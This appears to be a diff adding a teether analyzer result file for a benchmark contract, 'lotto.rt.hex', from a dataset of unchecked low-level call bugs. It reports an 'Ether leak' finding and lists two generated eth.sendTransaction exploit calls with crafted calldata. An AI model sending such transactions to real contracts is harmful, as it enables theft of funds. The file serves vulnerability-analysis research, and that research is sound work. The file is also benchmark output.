@@ -1,0 +1,20 @@
+{
+    "errors": [],
+    "fails": [],
+    "findings": [
+        {
+            "exploit": [
+                "eth.sendTransaction({from:\"0x0000000000000000000000000000000000001234\", data:\"0x8f1c05851c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c\", to:\"0x0000000000000000000000000000000000001000\", gasPrice:0})",
+                "eth.sendTransaction({from:\"0x0000000000000000000000000000000000001234\", data:\"0x1846f51a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a\", to:\"0x4000000000000000000000000000000000000000\", gasPrice:0})"
+            ],
+            "filename": "dataset/unchecked_low_level_calls/lotto.rt.hex",
+            "name": "Ether leak"
+        }
+    ],
+    "infos": [],
+    "parser": {
+        "id": "teether",
+        "mode": "runtime",
+        "version": "2022/11/11"
+    }
+}
